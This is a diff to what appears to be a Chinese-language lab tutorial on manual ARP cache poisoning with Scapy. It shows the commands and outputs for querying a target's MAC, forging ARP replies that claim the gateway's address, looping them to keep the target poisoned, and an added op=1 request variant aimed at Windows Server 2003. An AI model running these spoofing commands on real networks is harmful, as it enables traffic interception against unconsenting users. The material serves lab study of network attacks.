@@ -22,11 +22,12 @@ $ sudo python3 -m pip install scapy
 
 
 #### 手工利用
-```
+```python
 #创建raw_socket需要root权限
 $ sudo scapy
 #设定使用的网络接口
 >>> conf.iface="ens33"
+
 =============================================================================
 #目的：查询靶机A的硬件地址
 #使用sr1函数，发送一个数据包，接收一个数据包
@@ -39,10 +40,12 @@ Begin emission:
 
 Received 1 packets, got 1 answers, remaining 0 packets
 '00:0c:29:4a:25:26'
+
 =============================================================================
 #目的：查询当前使用的网卡的硬件地址
 >>> ARP().hwsrc
 '00:0c:29:a7:3b:4d'
+
 =============================================================================
 #目的：告知靶机A，网关的硬件地址为攻击机的硬件地址
 #使用send函数，发送数据包，不接收返回数据包
@@ -51,6 +54,7 @@ Received 1 packets, got 1 answers, remaining 0 packets
 >>> send(ARP(op=2, psrc="192.168.247.2", pdst="192.168.247.16"))
 .
 Sent 1 packets.
+
 =============================================================================
 #目的：基于上题的目的，改为循环发送ARP数据包，保持靶机被毒化状态
 #使用srloop函数循环发送数据包
@@ -62,6 +66,15 @@ fail 1: ARP is at 00:0c:29:a7:3b:4d says 192.168.247.2
 fail 1: ARP is at 00:0c:29:a7:3b:4d says 192.168.247.2
 fail 1: ARP is at 00:0c:29:a7:3b:4d says 192.168.247.2
 fail 1: ARP is at 00:0c:29:a7:3b:4d says 192.168.247.2
+
+#如果指定op=1，win server 2003会自动根据请求报文的源ip:源mac信息来创建/更新arp表项
+srloop(ARP(op=1, psrc="192.168.247.16", pdst="192.168.247.19"))
+RECV 1: ARP is at 00:0c:29:92:f5:ac says 192.168.247.19 / Padding
+
+RECV 1: ARP is at 00:0c:29:92:f5:ac says 192.168.247.19 / Padding
+RECV 1: ARP is at 00:0c:29:92:f5:ac says 192.168.247.19 / Padding
+RECV 1: ARP is at 00:0c:29:92:f5:ac says 192.168.247.19 / Padding
+RECV 1: ARP is at 00:0c:29:92:f5:ac says 192.168.247.19 / Padding
 
 
 ```
